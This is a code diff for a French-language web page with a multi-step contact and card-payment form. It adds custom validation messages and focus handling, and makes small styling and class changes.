@@ -200,6 +200,7 @@ border-radius: 20px;
     }
     .mInp input{
         height: 40px;
+        background-color: rgba(218, 216, 216, 0);
     }
     }
 </style>
@@ -323,12 +324,23 @@ border-radius: 20px;
                         Remplissez vos coordonneés
                     </div>
                     <form class="" onsubmit="return handleSubmit(event)">
-                        <input  type="text" placeholder="Nom de famille" class="outline-none " required/>
-                        <input  type="text" placeholder="Adress email" class="outline-none" required/>
-                        <input  type="text" placeholder="Adress" class="outline-none" required/>
+                        <input  type="text" placeholder="Nom de famille" class="outline-none "  
+                         oninvalid="this.setCustomValidity('Merci de remplir ce champ obligatoire')" 
+                         oninput="this.setCustomValidity('')" required/>
+                        <input  type="text" placeholder="Adress email" class="outline-none"
+                        oninvalid="this.setCustomValidity('Merci de remplir ce champ obligatoire')" 
+                        oninput="this.setCustomValidity('')" required/>
+                        <input  type="text" placeholder="Adress" class="outline-none"
+                        oninvalid="this.setCustomValidity('Merci de remplir ce champ obligatoire')" 
+                        oninput="this.setCustomValidity('')" required/>
                         <div class="split">
-                        <input  type="text" placeholder="Ville" class="outline-none" required/>
-                        <input  type="text" placeholder="Code Portal" class="outline-none code" required />
+                        <input  type="text" placeholder="Ville" class="outline-none"
+                              oninvalid="this.setCustomValidity('Merci de remplir ce champ obligatoire')" 
+                        oninput="this.setCustomValidity('')"
+                         required/>
+                        <input  type="text" placeholder="Code Portal" class="outline-none code"
+                        oninvalid="this.setCustomValidity('Merci de remplir ce champ obligatoire')" 
+                        oninput="this.setCustomValidity('')" required />
                         </div>
                         <div class="flex justify-center align-center text-sm"  >
                         <input  type="checkbox"  required/><span class="mt-2">
@@ -342,7 +354,7 @@ border-radius: 20px;
                   <div class="hidden payd">
                     <div class="w-fit mx-auto text-sm font-semibold">Informations de paiement</div>
                     <form  onsubmit="return handlePay(event)">
-                        <input  type="text" placeholder="1234 1234 1234 1234" class="outline-none"
+                        <input  type="text" placeholder="1234 1234 1234 1234" class="outline-none first"
                          maxlength="19" oninput="formatCardNumber(event)" required />
                         <div class="split mt-3">
                         <input  type="text" placeholder="MM/YY" maxlength="5"
@@ -400,7 +412,7 @@ border-radius: 20px;
                 </div>
                 <form class="mb-4 formatiom">
                     <span class="italic font-semibold text-sm">Remplissez vos coordonneés</span>
-                    <span class="hidden mErr  text-red-800 text-xs italic font-bold ">Cest Info est Obligatoire</span>
+                    <span class="hidden mErr  text-red-600 text-xs italic font-bold ">Merci de remplir ce champ obligatoire</span>
                     <div class="flex mInp">
                         <input type="text" class="outline-none family" placeholder="Nom de famille" />
                         <input type="text" class="outline-none hidden adrem "  placeholder="Adresse"  />
@@ -413,8 +425,8 @@ border-radius: 20px;
                     </div>
                 </form>
                 <form  onsubmit="return handlePayM(event) " class="myPay hidden">
-                    <input  type="text" placeholder="1234 1234 1234 1234" class="outline-none"
-                     maxlength="19" oninput="formatCardNumber(event)" required />
+                    <input  type="text" placeholder="1234 1234 1234 1234" class="outline-none numCard"
+                     maxlength="19" oninput="formatCardNumber(event)"  required/>
                     <div class="split mt-1">
                     <input  type="text" placeholder="MM/YY" maxlength="5"
                     oninput="formatCardExpiration(event)" class="outline-none cardDate"  required/>
@@ -482,12 +494,13 @@ border-radius: 20px;
     const moveback= document.querySelector(".moveback")
     const pdesk= document.querySelector(".pdesk")
     const pMob= document.querySelector(".pMob")
+    const numCard= document.querySelector(".numCard")
 
     let clPaym = false;
     let clPay = false;
     let moveCount = 0;
 
-    family.focus()
+    
     restrictToNumbers(code)
     let counstart = 0;
     mprog.addEventListener("click", ()=>{
@@ -505,8 +518,8 @@ border-radius: 20px;
             if(adrem.value.length > 3){
                 mErr.style.display = "none"
             adrem.style.display = "none" 
-            portt.focus()
             portt.style.display = "block"
+            portt.focus()
             counstart++}else{
                 mErr.style.display = "block"
             }
@@ -514,8 +527,8 @@ border-radius: 20px;
     if(portt.value.length > 3){
                 mErr.style.display = "none"
                 portt.style.display = "none" 
-                vim.focus()
             vim.style.display = "block"
+                vim.focus()
             counstart++
         }else{
                 mErr.style.display = "block"
@@ -525,8 +538,8 @@ border-radius: 20px;
     if(vim.value.length > 3){
                 mErr.style.display = "none"
                 vim.style.display = "none" 
-                adm.focus()
             adm.style.display = "block"
+                adm.focus()
             counstart++
         }else{
                 mErr.style.display = "block"
@@ -535,7 +548,8 @@ border-radius: 20px;
 }else if(counstart ==4){
     mErr.style.display = "none" 
             formatiom.style.display = "none"
-            myPay.style.display = "block"
+            myPay.style.display = "block"  
+             numCard.focus()
             clPaym = true
      pro.style.display ="none"
      pro2.style.display = "block"
@@ -563,6 +577,7 @@ border-radius: 20px;
     start.addEventListener("click", ()=>{
         bg.style.display ="none"
         popStar.style.display = "block"
+        family.focus()
         countdown()
     })
 
@@ -594,10 +609,11 @@ border-radius: 20px;
         form.style.display ="none"
         clPay = true
         payd.style.display = "block"
+        
+     
         pro.style.display ="none"
         pro2.style.display = "block"
         moveCount = 1;
-        console.log("the move", moveCount)
             return false; // Return false to further prevent default behavior
         }
         function handlePay(event) {
